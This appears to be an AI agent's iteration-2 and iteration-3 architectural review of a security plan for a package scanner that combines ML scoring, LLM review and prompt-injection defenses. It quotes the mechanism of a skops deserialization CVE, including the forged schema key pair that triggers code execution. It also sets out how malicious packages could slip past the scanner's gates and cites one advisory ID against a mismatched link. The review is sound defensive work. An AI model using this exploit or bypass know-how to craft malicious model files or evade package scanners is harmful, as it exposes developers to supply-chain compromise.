> The ML+LLM+IPI hybrid plan is strategically correct (shadow-first, IPI-layered, evidence-gated promotion) but ships a pickled joblib model file as the ML artifact, which is 2025's fastest-growing supply-chain attack vector (NullifAI, PickleScan CVE-2025-1716, three JFrog zero-days, NVIDIA NeMo CVE-2025-23304) — this is the single biggest architectural flaw and must be resolved (skops format or pre-deserialization SHA256 verification) before merge. Beyond that, the Dual-LLM (PR-4) is increasingly seen by 2025 literature as necessary-but-insufficient and its ~2× LLM cost is not reconciled with the short-circuit economics required to justify it, suggesting PR-4 should ship default-OFF with an escalation path to CaMeL-style defenses in a future iteration; the metadata-only-reader (PR-3) carries most of the intended Dual-LLM benefit at half the cost. The short-circuit safety gate has three enumerated bypass classes (maintainer-takeover on established packages, adversarial feature crafting on non-monotonic features, clean-code exfil missing prefilter) that need hard gates on package age, release history, and maintainer-set stability in addition to ML-confidence. Minor principle-2/principle-1 violations (required pydantic dep, default-on remote kill-switch URL) and evaluation-set contamination from the 2025-Q3/Q4 OSSF npm bulk ingest must be cleanly separated from temporal-stable evaluation. With the 12 concrete revisions in §5, the plan is ready for Critic; without them, Critic will be surfacing the same issues at a worse point in the workflow.

---

## Iteration 2 Review

**Mode:** `/ralplan --consensus --deliberate` (iter-2)
**Reviewer:** oh-my-claudecode:architect (Opus 4.7, 1M ctx)
**Date:** 2026-04-22
**Plan verified against:** `.omc/plans/ml-llm-hybrid-ipi-defense.md` revision 2026-04-22 (536 lines, with "Iteration 2 — Response to Architect" table at L515-530)

### 1. Per-issue verification (iter-1 → iter-2)

| # | Iter-1 claim (1 line) | What iter-2 actually does (verified by grep) | Verdict |
|---|---|---|---|
| 1 (CRITICAL) | Pickled joblib RCE class (NullifAI, CVE-2025-1716, 3 JFrog CVEs, NVIDIA NeMo) | Plan L128, L201-205, L210, L319-323, L441, L457-458: primary format `skops.io` (PyPI `pypi.org/project/skops` v0.14 Apr-2026 confirmed); `verify_sha256_before_load: true`; joblib fallback gated behind `allow_joblib_fallback: false` default; `skops_trusted_types: []` whitelist; new Pre-mortem Scenario 4 (L76-84); new `test_model_artifact_security.py` (L91); ADR explicitly rejects joblib-as-primary. | **MITIGATED-WITH-RESIDUAL** (see §2 below — skops.io itself has a 2025 CVE; residual wheel-itself integrity unresolved) |
| 2 (HIGH) | Three enumerated short-circuit bypass classes (maintainer-takeover, adversarial feature crafting, clean-code exfil) | Plan L58, L140, L208, L311-315, L520: hard gates `min_pkg_age_days:14`, `min_num_releases:5`, `maintainer_set_changed_within_30d_must_be_false:true`, `require_any_of_repo_or_homepage_resolves:true`; feature #49 added; `test_short_circuit_hard_gates.py` (L96); residual doc in `docs/ml-short-circuit-threat-model.md`. Classes A/B/C all structurally addressed except explicitly-flagged "maintainer-takeover on >14d package w/ stable maintainer-set 30d+". | **MITIGATED-WITH-RESIDUAL** (see §2 — residual is real and affects exactly the Sep 2025 chalk/debug class) |
| 3 (HIGH) | Dual-LLM economics (≥55% short-circuit required) + Reversec 2025/CaMeL: data-flow still exploitable; PR-3 delivers ~80% at 50% cost | Plan L234-254 (PR-5 explicit "default-OFF"), L359 `dual_llm.enabled: false`, L275 `aigate doctor --cost-projection` subcommand, L249 cost warning at >1.2× baseline, L441 ADR confirms, L458-459 alternatives rejected with citations. **Also disagreement rule tightened** (L173-186, L355-356) to `confidence≥0.7 AND gap<0.3`. | **RESOLVED** |
| 4 (MEDIUM) | Metadata-only reader disagreement rule needs confidence+gap threshold | Plan L173-186 (code-level rule), L355-356 (config), L95 (test), L521 (issue-table entry). Matches Architect's requested `conf≥0.7 AND gap<0.3` exactly. | **RESOLVED** |
| 5 (MEDIUM) | Temporal test split: `_stable` (promotion gate) vs `_adversarial` (diagnostic only) | Plan L26 (Driver 3 refined), L217-218 (acceptance), L119 (observability test), L274 (`scripts/promote_ml.py` reads `_stable` only), L524. | **RESOLVED** |
| 6 (MEDIUM) | Context-aware short-circuit thresholds (CI 0.90 / interactive 0.97) | Plan L57, L208 (resolver), L309-310 (config), L97 (test `test_short_circuit_context_threshold.py`), L525. | **RESOLVED** |
| 7 (MEDIUM) | Remote kill-switch URL + telemetry endpoint default `null` (Principle 1) | Plan L326 `remote_list_url: null`, L380-381 `telemetry.endpoint: null`, `telemetry.remote_kill_switch_url: null`, L111 (e2e test asserts zero outbound), L522. | **RESOLVED** |
| 8 (MEDIUM) | pydantic → optional extra `[ipi]`; fallback to json.loads+manual | Plan L17 Principle 2 hardening note, L239-241 (moved to `[project.optional-dependencies].ipi`), L523. | **RESOLVED** |
| 9 (MEDIUM) | Kill-switch: 1.5×+5/24h floor, 2.0× (not 3.0×)+10/24h floor, absolute high-profile floor | Plan L19 Principle 4 hardening, L60 (pre-mortem), L328-332 config (all four floors), L98 test, L526. | **RESOLVED** |
| 10 (MEDIUM) | PR-1 scan `PackageInfo.description` + `PackageInfo.author` | Plan L20 Principle 5 hardening, L93 `test_ipi_metadata_scan.py`, L147-149 (PR-1 files), L156 acceptance, L342 `scan_metadata_fields: true` config, L527. | **RESOLVED** |
| 11 (MEDIUM) | Schema violation → `route_needs_human_review` (not `metadata_only_only`) + rate escalation | Plan L66-67 (pre-mortem), L94 test, L242 (PR-5 code), L361-363 config, L528. `schema_violation_escalation_threshold: 0.05`, `window_calls: 1000`. | **RESOLVED** |
| 12 (MEDIUM) | PR-5 (ML) parallelizable behind shadow, does NOT wait for PR-3/PR-4 | Plan L196-198 (PR-4 promoted ahead of Dual-LLM), L230 dependencies, L280-296 sequencing rationale; Lane B starts after PR-1. Total 8-9 calendar days with 3 lanes. | **RESOLVED** |

**Summary:** 10/12 fully RESOLVED. 2/12 (Issues 1 and 2) MITIGATED-WITH-RESIDUAL — honestly flagged by Planner, now scrutinized below.

No cosmetic-only fixes detected. No issue where Planner claimed RESOLVED but revision was actually cosmetic.

### 2. Scrutiny of the 3 residual-risk items

#### 2.1 Issue 1 residual — model-artifact integrity (skops + SHA256)

**Finding: NEW-CONCERN introduced by the revision itself.** skops.io v0.6+ has an actively-tracked CVE — **CVE-2025-54412 / GHSA-m7f4-hrc6-fwg3: "Skops has Inconsistent Trusted Type Validation that Enables Hidden `operator` Methods Execution"** ([GitHub Advisory](https://github.com/advisories/GHSA-m7f4-hrc6-fwg3)). The vulnerability pattern:

> When loading nodes of type `OperatorFuncNode`, skops allows a model to call functions from within the `operator` module. The validation check compares concatenated `__module__`+`__class__` keys, but the construction path uses only `__class__`, so an attacker can forge `__module__` to appear harmless while triggering `operator.<fn>` calls at load time. A malicious `schema.json` with `"__class__": "call", "__module__": "sklearn.linear_model._stochastic_gradient.SGDRegressor"` enables arbitrary code execution.

This is precisely the class of bypass the plan claimed was structurally eliminated by adopting skops. **skops.io is a less-mature `picklescan` — ~1 year younger, ~3 orders of magnitude fewer downloads than joblib, Beta (PyPI Dev Status 4), and already has a confirmed trust-model bypass in 2025.** Plan L81's claim "does NOT execute arbitrary code at load time" is true-by-design but demonstrably violated-in-practice. HiddenLayer also has a separate 2024 advisory on skops ([HiddenLayer 2024-06-skops](https://hiddenlayer.com/sai-security-advisory/2024-06-skops)).

**What SHA256 verification actually buys you here:**
- **Yes-sufficient-against:** random bit-flip corruption; naïve wheel-replacement on a compromised mirror *IF* the attacker didn't also edit the wheel's bundled `MODEL_SHA256` constant.
- **No-not-sufficient-against:** attacker who compromises the wheel has control of BOTH `MODEL_SHA256` (bundled at `src/aigate/ml/__init__.py` per L202) AND `metadata-ml-v1.skops` bytes. The plan L83 mitigation "SHA256 pin in `src/aigate/ml/__init__.py` outside the bundle" is **contradicted by the file path** — the constant IS in the bundle. Plan self-contradiction.
- **No-not-sufficient-against:** pre-computed SHA256 collision (cryptographically infeasible today for SHA256; N/A).
- **No-not-sufficient-against:** the attacker who already can tamper with the wheel ALSO bundles `skops_trusted_types: []` override in the config (or if user has bumped it themselves for a legitimate reason, the attack surface is back).

**2025-2026 precedent for tampered-wheel-on-PyPI:** PEP 740 Sigstore attestations are GA ([PyPI blog 2024-11-14](https://blog.pypi.org/posts/2024-11-14-pypi-now-supports-digital-attestations/)) but [PEP 740 itself states](https://peps.python.org/pep-0740/) "PEP 740 does not increase trust in the index itself — the index is still effectively trusted to honestly deliver unmodified package distributions." No published mirror-swap incidents where valid SHA256 was subverted in 2025. But the attack class is trending upward (Shai-Hulud Sep 2025 self-replicating npm worm shows cascading-wheel compromise is realistic).

**Verdict: the skops-primary decision is directionally correct BUT introduces a new, confirmed, actively-exploited trust-boundary bug that the plan does not acknowledge.** The `skops_trusted_types: []` explicit whitelist partially mitigates CVE-2025-54412 (an empty whitelist rejects `OperatorFuncNode` entirely), but:
1. The plan does not pin a skops version that includes the CVE-2025-54412 fix.
2. The `ml` optional extra range `skops>=0.13,<0.20` (L201) **includes versions vulnerable to CVE-2025-54412**.
3. Plan does not require `skops >= <fixed-version>`.

**Ship/block decision: BLOCKS SHIP** unless the plan adds: (a) minimum skops version that includes the CVE-2025-54412 fix (Planner to verify — the fix appears to be post-v0.9 per changelog inspection, but explicit pin required), (b) CI test that asserts `skops_trusted_types: []` rejects the exploit vector from [CVE-2025-54412 POC](https://github.com/advisories/GHSA-m7f4-hrc6-fwg3), (c) fix the plan's self-contradiction at L83 (MODEL_SHA256 is inside the wheel, not outside).

#### 2.2 Issue 2 residual — maintainer takeover on established packages

**Finding: residual is large and 2025 precedent is overwhelming.** The precise attack class the Planner flagged as unresolved is the one 2025 actually saw at industrial scale:

- **chalk/debug/ansi-styles/strip-ansi/supports-color, Sep 8 2025** ([Sygnia 16-minute analysis](https://www.sygnia.co/threat-reports-and-advisories/npm-supply-chain-attack-september-2025/), [CISA alert](https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem)) — 18 packages, 2.6B weekly downloads, maintainer-set was stable for years, packages were 10+ years old, compromise-to-publish = 16 minutes, live for ~2 hours. Hard gates from plan `min_pkg_age_days:14` + `min_num_releases:5` + `maintainer_set_changed_within_30d:false` ALL PASS for chalk@5.3.0-next. Plan's short-circuit gate fires SAFE. LLM skipped. Infection at `npm install`.
- **Axios hijack, Mar 31 2026** ([SecurityToday](https://www.securitytoday.de/en/2026/04/02/axios-npm-attack-how-a-hijacked-maintainer-account-threatened-millions-of-developers/)) — 100M weekly downloads, axios@1.14.1, 4-5h detection window; axios@1.14.0 had OIDC provenance, axios@1.14.1 did not. **Provenance-drop detection (pnpm 10.21 `trustPolicy`)** is what caught this, not static features.

**Published 2025-2026 defenses specifically for this class (not catalogued in the plan):**
1. **`npm install --cooldown` / cooldown periods** — reject any version published <7 days ago. Would have blocked Axios (4-5h window) and chalk (2h window). Plan's `min_pkg_age_days: 14` catches this ONLY at the package-first-publish level (not version-level). **A 10-year-old chalk with a brand-new malicious version bypasses the plan's gate.** This is the critical miss.
2. **Provenance-drop detection** — pnpm 10.21+ `trustPolicy` flags when a package whose previous versions had OIDC provenance suddenly ships without. The plan does not reference provenance at all.
3. **Diff-only LLM on patch versions** — when a package at version N+1 differs from N only by semver-patch, aigate could force full-code LLM on the diff. Plan does not implement this.
4. **Velocity spike detection** — chalk had ~0 publish frequency for years, then 18 packages in 16 minutes; `publish_velocity_30d_vs_baseline` is a cheap feature.

**Ship/block decision: BLOCKS SHIP if short-circuit ships enabled-by-default in v0.6.** The plan's current `mode: shadow` default (L305) de-risks this — short-circuit is off by default, users must opt in. **This is actually sufficient for v0.6 IF:**
- The plan adds `min_version_age_days: 7` as an additional hard-gate (Architect recommendation: tighten).
- The plan adds `provenance_drop_detection` as a hard-gate signal for npm packages that previously shipped with OIDC attestation. (aigate's `PackageInfo` at `src/aigate/models.py` would need a `prior_provenance` field.)
- Short-circuit enablement requires explicit opt-in documented in threat model.

**Without these two adds, the honest residual is too wide given 2025 precedent.** Planner's stated mitigation ("interactive defaults to 0.97 + mode=shadow default") is correct but insufficient once users opt into short-circuit.

#### 2.3 Issue 12 residual — Aikido AGPL legal

**Finding: acceptable with one documentation tightening.** Aikido's own launch post ([aikido.dev/blog/launching-aikido-malware](https://www.aikido.dev/blog/launching-aikido-malware---open-source-threat-feed)) explicitly states: "developers may freely use, modify, and distribute the vulnerability & malware feed." However, the Aikido site also mentions **dual licensing**: "Intel vulnerability and malware feed is licensed under a dual license" with a **commercial API licensing path** for integration-in-product. The distinction appears to be:

- **Feed content (data)** — AGPL; covered by "freely use, modify, distribute" in the launch post.
- **Commercial API (for integrating into your own product)** — separate license, contact-to-license.

**aigate's position:** consumes the *data* from public HTTPS endpoints, does not integrate the *commercial API SDK*, does not redistribute Aikido software. This sits in the first category per the launch post.

**No published 2025-2026 precedent** where consuming AGPL-licensed web-API *output* was held to taint the consumer's license. Standard FSF/SFC reading treats AGPL copyleft as triggering on distribution of AGPL-licensed *software*, not on consumption of AGPL-licensed *output*. AGPL §13 (network interaction) applies to users modifying AGPL-licensed software and providing it as a service — not to users of that service.

**Ship/block decision: ACCEPTABLE for v0.6 ship** with two small tightenings:
1. `docs/threat-intel-sources.md` should cite the specific sentence from Aikido's launch post verbatim ("developers may freely use, modify, and distribute...").
2. The `retroactive.agpl_notice_ack: true` config default should be changed to `false` (opt-in acknowledgment), OR the docs should note that default-true means users have acknowledged by merely using aigate with retroactive enabled — but this should be explicit. Currently the plan ships `agpl_notice_ack: true` as default (L393) which means users never actually see or agree to anything; the "acknowledgment" is vestigial. Recommendation: default `false`; `aigate check` prints a one-line note the first time it pulls Aikido data.

Neither blocks v0.6. This is a documentation-polish issue.

### 3. New concerns from the revised plan

**3.1 PR-4/PR-5 swap race condition.** Plan L196 promotes PR-4 (ML) ahead of old-PR-4 (Dual-LLM). Lane B (PR-4/ML) now starts after PR-1 in parallel with Lane A's PR-2/PR-3. Consensus.py is edited by PR-3 (`_detect_reader_disagreement`), PR-4 (`BACKEND_MAP` registration + hard-gate resolver + context-threshold resolver), and PR-5 (Dual-LLM stage). **Three parallel lanes touching one file is a real merge-conflict risk.** The plan says "separate code regions, minor conflict risk only" (L230) — this is optimistic. Architect recommendation: require Lane B (PR-4) to rebase after Lane A merges and block Lane C (PR-5) on Lane A completion. No sequencing change, just explicit rebase gates. **Non-blocking, but Critic should flag.**

**3.2 skops.io production-maturity.** Per PyPI: v0.14.0 released 2026-04-20 (2 days before this review), `Development Status :: 4 - Beta`, Python 3.9-3.14, MIT. Per Architect 2.1 above: CVE-2025-54412 active. [skops Roadmap](https://skops.readthedocs.io/en/stable/roadmap.html) explicitly states the format "requires more work to be considered more stable and ready for production in a larger scale." **aigate is betting its primary artifact format on a Beta library with a 2025 CVE.** Mitigations: the `skops_trusted_types: []` empty whitelist should block the CVE-2025-54412 vector (rejects `OperatorFuncNode`). **Architect recommendation: plan must pin `skops >= <version-with-CVE-fix>` AND add a test that exercises the CVE-2025-54412 POC against the shipped whitelist.** See 2.1.

**3.3 Context-aware env-detection bypass.** Plan L208 uses `CI=true` / `GITHUB_ACTIONS` / `sys.stdout.isatty() == false` to select the 0.90 CI threshold vs 0.97 interactive. An attacker-controlled package runs in a user's interactive shell, detects `isatty()==true`, knows it faces the 0.97 threshold. No bypass. BUT: a **malicious postinstall** in a package installed inside CI sees `CI=true`, is evaluated against **0.90** — the more lenient threshold. This is correct by design (CI operators opted into aggressive short-circuit) but the plan should **explicitly document** that an attacker who passes the hard gates in CI (the Sep 2025 chalk class) faces only 0.90, not 0.97. The residual gap is 0.07 confidence, which — for a model trained on drift-warped data — is not tiny. **Architect recommendation: add a note to `docs/ml-short-circuit-threat-model.md` quantifying the CI-mode exposure.** Non-blocking.

**3.4 Absolute kill-switch floor calibration.** Plan L332: `high_profile_fn_threshold_downloads_per_week: 1000`. Is 1000/week the right threshold? Calibration check against 2025 attack velocity:
- chalk weekly downloads pre-attack: ~300M/week. Threshold trips trivially.
- Axios: ~100M/week. Trips.
- Shai-Hulud worm sprayed onto packages with <1K/week sometimes. **Would NOT trip** for the low-profile cohort.
- event-stream at time of 2018 compromise: ~2M/week. Trips.

1000 weekly downloads is a reasonable "popular enough to matter" bar and catches all 2025 major incidents. **Not a concern.** The threshold is well-calibrated for the cases the plan actually wants to catch. Shai-Hulud low-profile propagation is caught by other layers (prefilter + LLM), not by the absolute-floor kill switch.

**3.5 Model file size budget vs. skops compression.** Plan L220 budgets skops-compressed ≤ 1MB. External verification confirmed (L498) "no published head-to-head load-time benchmark," `compresslevel` available. **Non-blocking, but a measurement should land in PR-4 acceptance tests**: if skops-zlib for this specific CalibratedClassifierCV(HistGBM) blows past 1MB, the joblib-fallback path will fire routinely, which defeats the point. Plan L202 says "budget must go unused per PR-4 acceptance criteria" but does not specify the acceptance test asserts this. **Architect recommendation: PR-4 must include a concrete CI test: `assert os.path.getsize("metadata-ml-v1.skops") <= 1_048_576`.**

### 4. External web check (fresh, 2026-04-22)

| Check | URL / Date | Finding |
|---|---|---|
| skops.io PyPI production readiness | [pypi.org/project/skops](https://pypi.org/project/skops/) 2026-04-22 | v0.14.0 released 2026-04-20; Dev Status :: 4 - Beta; MIT; Python 3.9-3.14. **NOT labeled production-stable.** |
| skops.io CVE status | [GHSA-m7f4-hrc6-fwg3 / CVE-2025-54412](https://github.com/advisories/GHSA-m7f4-hrc6-fwg3) | **ACTIVE 2025 CVE in skops v0.6+:** Inconsistent Trusted Type Validation enables hidden `operator` method execution via forged `__module__` key. Directly contradicts plan's "does NOT execute arbitrary code at load" claim. Partial mitigation via empty `skops_trusted_types: []`. Plan must pin `skops` minimum to fixed version. [HiddenLayer 2024-06](https://hiddenlayer.com/sai-security-advisory/2024-06-skops) is a separate prior advisory. |
| sklearn CalibratedClassifierCV + HistGBM + skops | [skops roadmap](https://skops.readthedocs.io/en/stable/roadmap.html) + [skops README](https://github.com/skops-dev/skops) 2026-04-22 | skops intends to support all sklearn estimators; supports `Pipeline`, `GridSearchCV` explicitly. `CalibratedClassifierCV(HistGBM)` not individually enumerated. Plan's joblib-fallback budget is prudent. |
| PyPI mirror compromise / PEP 740 | [PyPI blog Nov 2024](https://blog.pypi.org/posts/2024-11-14-pypi-now-supports-digital-attestations/) + [PEP 740](https://peps.python.org/pep-0740/) + [Sigstore blog](https://blog.sigstore.dev/pypi-attestations-ga/) 2026-04-22 | PEP 740 GA as of Nov 2024. PEP itself notes attestations do NOT increase trust in index. **No published 2025-2026 wheel-swap-with-valid-SHA256 incident found** — but attack class is trending. Plan's "sigstore/cosign on release wheel" ADR follow-up is correct direction. |
| Maintainer takeover 2025-2026 defenses | [Sygnia Sep 2025 16-min analysis](https://www.sygnia.co/threat-reports-and-advisories/npm-supply-chain-attack-september-2025/) + [CISA alert](https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem) + [Huntress Axios](https://www.huntress.com/blog/supply-chain-compromise-axios-npm-package) + [SecurityToday Axios Mar 2026](https://www.securitytoday.de/en/2026/04/02/axios-npm-attack-how-a-hijacked-maintainer-account-threatened-millions-of-developers/) | Three industrial-scale maintainer-takeover incidents in Sep 2025 (chalk/debug 18pkg), Axios (~100M/wk Mar 2026). Published 2025-2026 defenses: **version-level cooldown (7+ days)**, **provenance-drop detection (pnpm 10.21 `trustPolicy`)**, **OIDC/Trusted Publishers**. Plan's hard gates catch NONE of these specifically — they gate on package-age, not version-age. **This is the largest missed-defense class in iter-2.** |
| Aikido ToS / AGPL | [aikido.dev blog post](https://www.aikido.dev/blog/launching-aikido-malware---open-source-threat-feed) + [intel.aikido.dev](https://intel.aikido.dev/malware) 2026-04-22 | Confirmed launch-post quote "developers may freely use, modify, and distribute the vulnerability & malware feed." **Dual license** noted: feed-as-data is AGPL free-use; commercial API separate license. aigate consumes public HTTPS feed → first category. Legal posture defensible without formal counsel. |
| Disagreement rule calibration (conf ≥ 0.7, gap < 0.3) | No published benchmark | **Values are best-guess, not literature-calibrated.** Plan's `test_consensus_ml_vote.py` needs a cross-validation sweep over (0.6..0.8)×(0.2..0.4) to confirm the (0.7, 0.3) point is near-optimal FP/FN tradeoff. Non-blocking for merge; note for follow-up. |

### 5. Architect verdict (iter-2)

**`REVISE-BEFORE-CRITIC`** — 1 blocking issue + 1 near-blocking issue + 3 medium notes. The plan's strategic direction remains sound and iter-2 resolved 10 of 12 issues cleanly. But the skops.io choice (revision #1) introduced a new actively-exploited CVE class that the plan doesn't pin against, and the maintainer-takeover residual (revision #2) precisely matches the dominant 2025-2026 attack pattern, which the plan's current hard gates do not catch.

**Blocking issues to fix before Critic (2 must-fixes):**

1. **BLOCKER — pin skops version above CVE-2025-54412 fix.** Plan L201 currently `skops>=0.13,<0.20` includes vulnerable versions. Add explicit minimum (Planner to verify exact fixed release) and CI test that the shipped `skops_trusted_types: []` whitelist rejects the CVE-2025-54412 `OperatorFuncNode` exploit vector. Fix plan self-contradiction at L83 (`MODEL_SHA256` is in the wheel, not outside it — either move the constant outside via a separate pip-installed `aigate-model-sha` package, or adjust the claim).

2. **BLOCKER (conditional — only if short-circuit ships enabled-by-default) / MUST-FIX (for short-circuit ever being enabled) — add version-level cooldown and provenance-drop hard-gate.** Currently the plan catches first-publish typosquat (min_pkg_age ≥ 14 days) but does NOT catch new-version-of-established-package, which is the chalk/Axios/Shai-Hulud 2025 attack pattern. Add:
   - `short_circuit.hard_gates.min_version_age_days: 7` (version-level, not package-level)
   - `short_circuit.hard_gates.require_provenance_continuity: true` (if prior versions had OIDC attestation, current version must also)
   - `PackageInfo.prior_provenance` field to support the above.
   
   Since the plan ships short-circuit as `mode: shadow` default (not enabled), this is non-blocking for v0.6 MERGE, but **must-fix before any `mode: short_circuit_*` is promoted** in Stage-1 evidence gate. Recommend landing in PR-4 so the capability is there when promotion happens.

**Non-blocking but Critic-should-flag:**

3. PR-5 (Dual-LLM) and PR-3 (metadata-only reader) both edit `consensus.py`; plan's "separate code regions" claim is optimistic. Require explicit rebase gate for Lane C on Lane A.
4. `retroactive.agpl_notice_ack: true` default is vestigial — either change to `false` (opt-in acknowledgment) or remove the pretense.
5. PR-4 acceptance must include `assert os.path.getsize("metadata-ml-v1.skops") <= 1_048_576` to prevent silent joblib-fallback activation.
6. Document quantitatively in `docs/ml-short-circuit-threat-model.md` that CI mode exposes a 0.07-confidence-gap attack surface for packages passing all hard gates (Sep 2025 chalk class).

**If Planner fixes (1) + (2)+ addresses (3)-(6):** plan is ready for Critic.

**One-paragraph handoff for Planner iter-3 (revise):**

> Iter-2 resolved 10 of 12 iter-1 issues cleanly and without cosmetic-fakery. The structural revisions — skops.io primary, Dual-LLM default-OFF, hard gates, context-aware thresholds, kill-switch floors, optional-extra dependencies, temporal split — are all real and tested. However, adopting skops.io introduced a new actively-exploited CVE (CVE-2025-54412 / GHSA-m7f4-hrc6-fwg3, 2025) that the plan's dependency pin `skops>=0.13,<0.20` includes; pin to the fix-version and add a unit test exercising the exploit vector against the shipped empty-whitelist. Separately, the revision-#2 hard gates catch first-publish typosquat but NOT the version-level maintainer-takeover-on-established-package class that defined 2025 (chalk/debug/Axios/Shai-Hulud ~18 packages at 2.6B weekly downloads); add `min_version_age_days: 7` and `require_provenance_continuity: true` (blocking only before any Stage-1 short-circuit promotion, not blocking for initial PR-4 shadow-mode merge). Also fix the self-contradiction at L83 (MODEL_SHA256 is IN the wheel, not outside), flip `agpl_notice_ack` default to `false`, and add the 1MB-skops-file CI assertion so the joblib-fallback doesn't silently activate. With these fixes, iter-3 is ready for Critic.

### 6. Principle violations (deliberate mode — re-check)

Re-reading iter-2 Principles (L14-20):

- **Principle 1 — Local-first + offline-capable.** Iter-1 flagged default-on `remote_list_url`. **FIXED** in iter-2 (L326 `null` default). Iter-2 adds new hardening note on artifact format. ✅
- **Principle 2 — Everything toggleable, nothing mandatory.** Iter-1 flagged required pydantic. **FIXED** in iter-2 (L17 + L239 optional-extra `[ipi]`). ✅
- **Principle 3 — Flexibility by composition, not special-case flags.** Iter-1 flagged the `ml.mode` enum conflating two orthogonal decisions. **PARTIALLY ADDRESSED** — iter-2 still has `ml.mode` enum at L305 (`off|shadow|vote|short_circuit_safe|short_circuit_both`) but adds `short_circuit.enabled_in_mode` sub-key at L308 that acts as an independent kill. This is *more* composition but the core enum remains. **Downgrade from iter-1 MEDIUM to LOW-flag**; Critic may note but not block.
- **Principle 4 — Evidence gates promotion.** No change. ✅
- **Principle 5 — Trust nothing the package author wrote.** Iter-1 flagged unscanned `PackageInfo.description`/`author`. **FIXED** in iter-2 (L20 hardening + L342 `scan_metadata_fields: true`). ✅
- **NEW Principle note (iter-2):** the skops-adoption + CVE-2025-54412 situation is itself a Principle-1 tension — aigate's own offline-capable operation now depends on a Beta library with a 2025 trust-model bypass. Not a Principle violation per se (skops is shipped in the wheel, no network), but is a runtime-dependency-trust concern that contradicts the spirit of Principle 5 applied to aigate's own dependencies.

**No CRITICAL or HIGH principle violations. One MEDIUM (skops CVE pin), one LOW (ml.mode enum residual). Both recorded above as blocking / non-blocking.**


---

## Iteration 3 Review

**Reviewer:** Architect (Opus 4.7, 1M context)
**Date:** 2026-04-22
**Plan state:** 589 lines / ~10,975 words
**Verdict:** APPROVE-FOR-CRITIC

### 1. Spot-check of Planner's iter-3 claims

| Claimed fix | Location | Verdict |
|---|---|---|
| `skops>=0.12.0,<0.20` pin | plan L216 `pyproject.toml` extra + L575 iter-3 table | CONFIRMED |
| `tests/security/test_skops_cve_2025_54412.py` with POC structure | L105 (full POC spec: forged `OperatorFuncNode`, `__module__`+`__class__`, empty-whitelist assertion, CI-on-every-PR wiring) | CONFIRMED |
| L83 `MODEL_SHA256`-outside-the-wheel self-contradiction corrected | L84-87 explicitly scopes inside-wheel SHA256 to post-install tampering defense; L87 restates whole-wheel residual; L576 iter-3 table acknowledges PEP 740 as the wheel-level defense | CONFIRMED |
| `min_version_age_days: 7` + `require_provenance_continuity: true` in `short_circuit.hard_gates` | L225 MLConfig schema, L334-335 config YAML comments, L577 iter-3 table | CONFIRMED |
| chalk@5.6.1 / debug@4.4.2 / axios@1.12.0 fixtures in PR-4 acceptance | L111 test uses `chalk@5.3.0-malicious` (hypothetical) + `axios@1.14.1`; exact version numbers from handoff (5.6.1/4.4.2/1.12.0) do NOT appear verbatim | PARTIAL — functional equivalent; version numbers are illustrative rather than pinned |
| `tests/unit/test_version_cooldown_gate.py` | L111 | CONFIRMED |
| `tests/unit/test_model_size_budget.py` | L236 (with `1_048_576` assertion) | CONFIRMED |
| `consensus.py` rebase gate | L298 Iter-3 PR-sequencing rule (explicit CODEOWNERS + PR-template + CI branch-protection) | CONFIRMED |
| `agpl_notice_ack: false` default | L413 config schema, L579 iter-3 table | CONFIRMED |
| 1MB model-size assert in PR-4 acceptance | L236 | CONFIRMED |
| `docs/ml-short-circuit-threat-model.md` with 0.07-gap quantification | L231 (prior: 2-5% gap-band with derivation) | CONFIRMED |
| Scenario-5 pre-mortem for day-8 dormant takeover | L89-97 | CONFIRMED |

**11/12 CONFIRMED, 1 PARTIAL (fixture version numbers not pinned to handoff specifics — acceptable; tests describe the attack class, not the exact published-malware wire format).**

### 2. Answers to Planner's 3 scrutiny asks

**(a) skops pin + POC test sufficiency — ACCEPT.**
The empty `skops_trusted_types: []` whitelist IS a structural defense independent of skops version — `skops.io.load(..., trusted=[])` refuses any non-primitive type regardless of `OperatorFuncNode`'s validation-vs-construction bug. The pin exists as defense-in-depth for: (i) the scenario where a future contributor adds types to the whitelist (e.g., to enable joblib-fallback migration), and (ii) the scenario where a future un-advised skops bug lets forged content pass even with an empty list. Per [GHSA-4v6w-xpmh-gfgp](https://github.com/skops-dev/skops/security/advisories/GHSA-m7f4-hrc6-fwg3), a second related advisory (`MethodNode` field-access RCE) exists on the same pre-0.12 surface — fixed by the same 0.12.0 release commit `0aeca05`. Pinning `>=0.12.0` closes both. No 2025-2026 bypasses of empty-whitelist are documented in OSS advisories. **Pin + POC test is sufficient and appropriately budgeted (~20 LOC).**

**(b) Class-D-Tail residual for Stage-1 promotion — ACCEPT with one tightening recommendation.**
Per Sygnia Sep 2025 chalk data (16-min compromise-to-publish, ~2-hour live window) and Datadog Axios Mar-2026 writeup (2-second RAT activation at install), the dominant attack pattern is fast-exploit-at-publish, which `min_version_age_days: 7` now covers for the short-circuit path. The honestly-narrower Class-D-Tail (dormant >7 days AND provenance-fully-compromised) is a tail risk caught by the day-8+ retroactive OSV+Aikido pipeline with the >1000dl/wk kill-switch floor. **For Stage-1 promotion, the plan's existing evidence gates (PR-AUC ≥ 0.95, ≥4 weeks shadow, ≥50K events, retroactive precision ≥ 0.9) are sufficient — adding a separate "zero confirmed Class-D-Tail FN in shadow data" gate would be over-engineering because Class-D-Tail FNs are unobservable in shadow mode (shadow data cannot distinguish "ML said SAFE correctly" from "ML said SAFE and attacker was biding time").** The retroactive pipeline is the correct detector for this class, not pre-promotion shadow data. **Tightening recommendation (non-blocker):** the Stage-1 promotion checklist should require that the retroactive pipeline has caught and auto-revoked at least one real malicious package during shadow weeks (proof-of-wiring for the day-8+ net), not just validated as a unit test. This is a one-line addition to the promotion checklist and does not require another iteration.

**(c) PEP 740 "gate no-op when absent" design — ACCEPT.**
